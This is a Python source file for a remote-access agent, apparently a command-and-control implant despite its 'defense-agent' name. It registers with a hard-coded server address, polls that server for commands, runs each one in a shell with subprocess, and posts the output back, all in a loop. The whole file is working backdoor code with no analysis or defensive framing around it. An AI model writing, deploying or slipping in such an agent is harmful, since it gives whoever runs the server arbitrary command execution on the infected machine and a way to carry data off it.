import requests
import os
import time
import subprocess

C2_SERVER = "http://192.168.88.128:5000"
AGENT_ID = "defense-agent-001"

def register_agent():
    """Registers the agent with the C2 server"""
    data = {"id": AGENT_ID, "os": os.name}
    try:
        response = requests.post(f"{C2_SERVER}/register", json=data)
        if response.status_code == 200:
            print("[+] Agent registered successfully!")
        else:
            print("[-] Registration failed:", response.text)
    except Exception as e:
        print("[-] Error registering agent:", e)

def fetch_commands():
    """Polls the server for new commands"""
    while True:
        try:
            response = requests.get(f"{C2_SERVER}/command/{AGENT_ID}")
            if response.status_code == 200:
                command = response.json().get('command')
                if command:
                    print(f"[+] Executing: {command}")
                    try:
                        output = subprocess.check_output(
                            command, shell=True, stderr=subprocess.STDOUT, timeout=10
                        ).decode()
                    except subprocess.CalledProcessError as e:
                        output = e.output.decode()
                    except Exception as e:
                        output = str(e)

                    # Send result
                    try:
                        requests.post(f"{C2_SERVER}/result", json={"id": AGENT_ID, "output": output})
                    except Exception as e:
                        print("[-] Failed to send result:", e)
                else:
                    print("[*] No command received.")
        except Exception as e:
            print("[-] Error fetching command:", e)

        time.sleep(5)

if __name__ == "__main__":
    register_agent()
    fetch_commands()

